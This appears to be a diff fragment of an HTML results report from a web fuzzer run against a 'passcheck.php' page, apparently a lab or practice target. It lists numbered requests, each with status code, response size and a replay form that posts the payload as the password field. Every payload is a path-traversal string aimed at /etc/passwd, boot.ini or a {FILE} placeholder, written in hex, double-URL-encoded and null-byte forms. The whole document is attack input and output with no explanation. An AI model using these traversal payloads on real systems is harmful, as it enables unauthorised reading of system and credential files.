+<td><table><tr><td>..0x2f/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00158</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x2f{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x2f{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00159</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00160</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00161</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00162</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00164</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00165</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00166</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00167</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00168</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00169</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00170</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00172</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00173</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00174</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00171</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00163</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00124</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00123</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00122</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00121</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00118</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00120</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00117</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00116</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00115</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00114</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00113</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00110</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00112</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00109</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00106</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00108</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00175</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c..0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c..0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00177</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00181</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00200</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00199</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00012</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00/! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00/"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00011</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00034</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>.%00./.%00./etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=".%00./.%00./etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00036</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>..%00/etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..%00/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00194</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00193</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00038</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>.%00./etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value=".%00./etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00037</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%00../etc/passwd! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%00../etc/passwd"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00188</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00189</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini%00index.html"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00202</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}%00index.html"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00201</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}%00index.html"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00187</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00186</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>1e100</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="1e100"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00184</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>1,,,00.html</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="1,,,00.html"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00198</td>
+<td><font>-1</font></td>
+<td>   0L</td>
+<td>    0W</td>
+<td><table><tr><td>%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html! Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\/etc/passwd;index.html"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00183</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>1,,,00</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="1,,,00"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00180</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5cboot.ini</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5cboot.ini"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
+
+<tr><td>00179</td>
+<td><font color=#00aa00>200</font></td>
+<td>  74L</td>
+<td>  203W</td>
+<td><table><tr><td>..0x5c..0x5c{FILE}</td><td><form method="post" action="http://web/passcheck.php"><input type="hidden" name="password" value="..0x5c..0x5c{FILE}"><input type=submit name=b value="send POST"></form></td></tr></table></td>
+</tr>
